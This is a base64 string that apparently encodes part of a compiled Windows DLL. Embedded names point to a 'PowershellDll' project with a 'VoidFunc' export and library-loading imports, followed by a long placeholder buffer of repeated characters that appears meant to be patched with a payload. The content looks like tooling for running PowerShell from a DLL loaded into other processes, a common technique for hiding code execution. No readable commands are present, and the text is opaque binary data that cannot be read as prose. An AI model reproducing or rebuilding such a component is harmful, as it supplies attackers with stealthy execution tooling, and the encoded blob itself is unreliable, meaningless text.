AT6MKPtyW9gUpK2M2rYvEOJzypxMjZy/LOqvSEZxAAMBPowo+jRiAko4OZ0izDH+oOITo3tLROb0vumpIibC0sMtGaJEiBZMZBgAAAARMAAAAAAAAAAAAAA0AAABATAAASAAAAAAAAAABAAAAIgWTGQgAAAAMSwAAAAAAAAAAAAARAAAAUEsAAEgAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEj/p1kAAAAAAgAAAFsAAAAsRwAALC0AAAAAAABI/6dZAAAAAAwAAAAUAAAAiEcAAIgtAAAAAAAASP+nWQAAAAANAAAAyAIAAJxHAACcLQAAAAAAAEj/p1kAAAAADgAAAAAAAAAAAAAAAAAAAJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwYACAAQAAAAAAAAAAAAAAAAAAAAAAAADQQQCAAQAAANhBAIABAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAAAqJsAAGBFAAA4RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAHhFAAAAAAAAAAAAAIhFAAAAAAAAAAAAAAAAAAComwAAAAAAAAAAAAD/////AAAAAEAAAABgRQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA8JsAANhFAACwRQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAPBFAAAAAAAAAAAAAABGAAAAAAAAAAAAAAAAAADwmwAAAAAAAAAAAAD/////AAAAAEAAAADYRQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAyJsAAFBGAAAoRgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAGhGAAAAAAAAAAAAAIBGAAAARgAAAAAAAAAAAAAAAAAAAAAAAMibAAABAAAAAAAAAP////8AAAAAQAAAAFBGAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAYnAAA0EYAAKhGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAA6EYAAAAAAAAAAAAACEcAAIBGAAAARgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYnAAAAgAAAAAAAAD/////AAAAAEAAAADQRgAAAAAAAAAAAABSU0RTAm7XxFnGZEOizcnfz1lTNAEAAABDOlxVc2Vyc1xhZG1pblxEZXNrdG9wXFBvd2Vyc2hlbGxEbGxceDY0XFJlbGVhc2VcUG93ZXJzaGVsbERsbC5wZGIAAAAAAAAkAAAAJAAAAAIAAAAiAAAAR0NUTAAQAAAQAAAALnRleHQkZGkAAAAAEBAAAJAeAAAudGV4dCRtbgAAAACgLgAAIAAAAC50ZXh0JG1uJDAwAMAuAABwAQAALnRleHQkeAAwMAAADgAAAC50ZXh0JHlkAAAAAABAAADQAQAALmlkYXRhJDUAAAAA0EEAABAAAAAuMDBjZmcAAOBBAAAIAAAALkNSVCRYQ0EAAAAA6EEAAAgAAAAuQ1JUJFhDVQAAAADwQQAACAAAAC5DUlQkWENaAAAAAPhBAAAIAAAALkNSVCRYSUEAAAAAAEIAAAgAAAAuQ1JUJFhJWgAAAAAIQgAACAAAAC5DUlQkWFBBAAAAABBCAAAIAAAALkNSVCRYUFoAAAAAGEIAAAgAAAAuQ1JUJFhUQQAAAAAgQgAAEAAAAC5DUlQkWFRaAAAAADBCAAAIAwAALnJkYXRhAAA4RQAA9AEAAC5yZGF0YSRyAAAAACxHAAA8AwAALnJkYXRhJHp6emRiZwAAAGhKAAAIAAAALnJ0YyRJQUEAAAAAcEoAAAgAAAAucnRjJElaWgAAAAB4SgAACAAAAC5ydGMkVEFBAAAAAIBKAAAQAAAALnJ0YyRUWloAAAAAkEoAAGgEAAAueGRhdGEAAPhOAABIAQAALnhkYXRhJHgAAAAAQFAAAFAAAAAuZWRhdGEAAJBQAAB4AAAALmlkYXRhJDIAAAAACFEAABgAAAAuaWRhdGEkMwAAAAAgUQAA0AEAAC5pZGF0YSQ0AAAAAPBSAADeAwAALmlkYXRhJDYAAAAAAGAAAIA7AAAuZGF0YQAAAICbAADQAAAALmRhdGEkcgBQnAAA8AUAAC5ic3MAAAAAALAAAHgDAAAucGRhdGEAAADAAAA8AAAALmdmaWRzJHkAAAAAANAAAGAAAAAucnNyYyQwMQAAAABg0AAAgAEAAC5yc3JjJDAyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQoEAAo0BwAKMgZwGRkCAAcBKQAULQAAMAEAACEIAgAINCgAoBAAAMAQAACcSgAAIQAAAKAQAADAEAAAnEoAABkZBAAKNAsACnIGcBQtAAA4AAAAGTULACd0GgAjZBkAHzQYABMBFAAI8AbgBFAAABguAAAARAAAkgAAAP/////ALgAAAAAAAMwuAAABAAAA2C4AAAEAAAD1LgAAAwAAAAEvAAAEAAAADS8AAAQAAAAqLwAABgAAADYvAAAAAAAAUBIAAP////+QEgAAAAAAAJQSAAABAAAApBIAAAIAAADREgAAAQAAAOUSAAADAAAA6RIAAAQAAAD6EgAABQAAACcTAAAEAAAAOxMAAAYAAAA/EwAABwAAAJYVAAAGAAAAphUAAAQAAADmFQAAAwAAAPYVAAABAAAAMRYAAAAAAABBFgAA/////wEGAgAGMgJQGTAJACJkIAAeNB8AEgEaAAfgBXAEUAAAGC4AANhDAADKAAAA/////1AvAAAAAAAAXC8AAAAAAAB5LwAAAgAAAIUvAAADAAAAkS8AAAQAAACdLwAAAAAAAAAAAAAAAAAAgBYAAP////+3FgAAAAAAAMgWAAABAAAABhcAAAAAAAAaFwAAAgAAAEQXAAADAAAATxcAAAQAAABaFwAABQAAAOUXAAAEAAAA8BcAAAMAAAD7FwAAAgAAAAYYAAAAAAAARBgAAP////8ZKAk1GmQQABY0DwASMw2SCeAHcAZQAAAYJAAAAQAAAHQZAADAGQAAAQAAAMAZAABJAAAAAQQBAASCAAAhBQIABTQGAPAaAAAmGwAACE0AACEAAADwGgAAJhsAAAhNAAABCgQACmQHAAoyBnAhBQIABTQGAIAaAAC4GgAACE0AACEAAACAGgAAuBoAAAhNAAAhFQQAFXQEAAVkBwBQGwAAVBsAAFhOAAAhBQIABTQGAFQbAAB3GwAAOE0AACEAAABUGwAAdxsAADhNAAAhAAAAUBsAAFQbAABYTgAAAAAAAAEAAAARFQgAFXQJABVkBwAVNAYAFTIR4KItAAABAAAAMx0AAMAdAACpLwAAAAAAABEPBgAPZAgADzQGAA8yC3CiLQAAAQAAAFoeAAB4HgAAwC8AAAAAAAABFAgAFGQIABRUBwAUNAYAFDIQcAkaBgAaNA8AGnIW4BRwE2CiLQAAAQAAAN0eAACHHwAA3C8AAIcfAAABBgIABlICUAkEAQAEIgAAoi0AAAEAAADLIgAAViMAABIwAABWIwAAAQIBAAJQAAABDQQADTQKAA1yBlABBAEABEIAAAEEAQAEEgAAAQkBAAliAAABCAQACHIEcANgAjABCgQACjQGAAoyBnABBgIABjICMAENBAANNAkADTIGUAEVBQAVNLoAFQG4AAZQAAABDwYAD2QHAA80BgAPMgtwARIGABJ0CAASNAcAEjILUAECAQACMAAAAAAAAAEAAAABGQoAGXQJABlkCAAZVAcAGTQGABkyFeAAAAAAAAAAAFAbAAAAAAAAGE8AAAAAAAAAAAAAAAAAAAAAAAABAAAAKE8AAAAAAAAAAAAAAAAAAICbAAAAAAAA/////wAAAAAgAAAAgBoAAAAAAAAAAAAAAAAAAAAAAACsJwAAAAAAAHBPAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIhPAACwTwAAAAAAAAAAAAAAAAAAEAAAAMibAAAAAAAA/////wAAAAAYAAAAtCYAAAAAAAAAAAAAAAAAAAAAAADwmwAAAAAAAP////8AAAAAGAAAAHQnAAAAAAAAAAAAAAAAAAAAAAAArCcAAAAAAAD4TwAAAAAAAAAAAAAAAAAAAAAAAAMAAAAYUAAAiE8AALBPAAAAAAAAAAAAAAAAAAAAAAAAAAAAABicAAAAAAAA/////wAAAAAYAAAAFCcAAAAAAAAAAAAAAAAAAAAAAABI/6dZAAAAAHJQAAABAAAAAQAAAAEAAABoUAAAbFAAAHBQAACAGAAAhFAAAAAAUG93ZXJzaGVsbERsbC5kbGwAVm9pZEZ1bmMAAAAAIFEAAAAAAAAAAAAAPFMAAABAAADQUQAAAAAAAAAAAABKUwAAsEAAAChSAAAAAAAAAAAAAGRTAAAIQQAAOFIAAAAAAAAAAAAAEFQAABhBAAB4UgAAAAAAAAAAAAAQVQAAWEEAAJhSAAAAAAAAAAAAADBVAAB4QQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8FIAAAAAAAAGUwAAAAAAABZTAAAAAAAAKFMAAAAAAABiVQAAAAAAAHhVAAAAAAAAhFUAAAAAAACYVQAAAAAAALJVAAAAAAAAxlUAAAAAAADiVQAAAAAAAABWAAAAAAAAFFYAAAAAAAAoVgAAAAAAAERWAAAAAAAAXlYAAAAAAAB0VgAAAAAAALpWAAAAAAAApFYAAAAAAACKVgAAAAAAAFJVAAAAAAAAAAAAAAAAAAAQAAAAAAAAgAgAAAAAAACAFgAAAAAAAIAGAAAAAAAAgAIAAAAAAACAGgAAAAAAAIAVAAAAAAAAgA8AAAAAAACAmwEAAAAAAIAJAAAAAAAAgAAAAAAAAAAAWFMAAAAAAAAAAAAAAAAAAPBTAAAAAAAAcFMAAAAAAACGUwAAAAAAAJxTAAAAAAAAplMAAAAAAAC+UwAAAAAAANZTAAAAAAAAAAAAAAAAAAAiVAAAAAAAADRUAAAAAAAAKlQAAAAAAAAAAAAAAAAAAEBUAAAAAAAATFQAAAAAAABaVAAAAAAAAIZUAAAAAAAAqFQAAAAAAADEVAAAAAAAAOBUAAAAAAAA+FQAAAAAAAAGVQAAAAAAAGxUAAAAAAAAAAAAAAAAAABoAkdldE1vZHVsZUZpbGVOYW1lQQAAqwNMb2FkTGlicmFyeVcAAKQCR2V0UHJvY0FkZHJlc3MAAG0CR2V0TW9kdWxlSGFuZGxlVwAAS0VSTkVMMzIuZGxsAABPTEVBVVQzMi5kbGwAAE4BU3RyU3RySUEAAFNITFdBUEkuZGxsAA4AX19DeHhGcmFtZUhhbmRsZXIzAAABAF9DeHhUaHJvd0V4Y2VwdGlvbgAAPgBtZW1zZXQAAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACEAX19zdGRfZXhjZXB0aW9uX2NvcHkAACIAX19zdGRfZXhjZXB0aW9uX2Rlc3Ryb3kAJQBfX3N0ZF90eXBlX2luZm9fZGVzdHJveV9saXN0AABWQ1JVTlRJTUUxNDAuZGxsAAAYAGZyZWUAABkAbWFsbG9jAAAIAF9jYWxsbmV3aAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9lAD8AX3NlaF9maWx0ZXJfZGxsABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHgBfY3J0X2F0ZXhpdAAWAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtaGVhcC1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1ydW50aW1lLWwxLTEtMC5kbGwAVgJHZXRMYXN0RXJyb3IAANQDTXVsdGlCeXRlVG9XaWRlQ2hhcgC1A0xvY2FsRnJlZQCuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAACSBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAUgVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIADwJHZXRDdXJyZW50UHJvY2VzcwBwBVRlcm1pbmF0ZVByb2Nlc3MAAHADSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudAAwBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyABACR2V0Q3VycmVudFByb2Nlc3NJZAAUAkdldEN1cnJlbnRUaHJlYWRJZAAA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBUA0luaXRpYWxpemVTTGlzdEhlYWQAagNJc0RlYnVnZ2VyUHJlc2VudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACAAQAAAAoAAAAAAAAABAACgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//dZgAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA